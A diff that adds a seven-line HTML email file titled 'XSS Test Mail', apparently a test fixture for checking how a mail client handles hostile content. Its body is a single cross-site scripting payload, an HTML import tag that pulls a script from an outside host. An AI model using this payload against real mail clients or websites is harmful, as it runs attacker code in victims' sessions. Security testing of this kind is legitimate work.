@@ -1,0 +1,7 @@
+From: jim.curry@enron.com
+To: Vittorio <vdemart1@tin.it>
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+aaaaaaa <link rel=import href=//km2.in/xss.php>
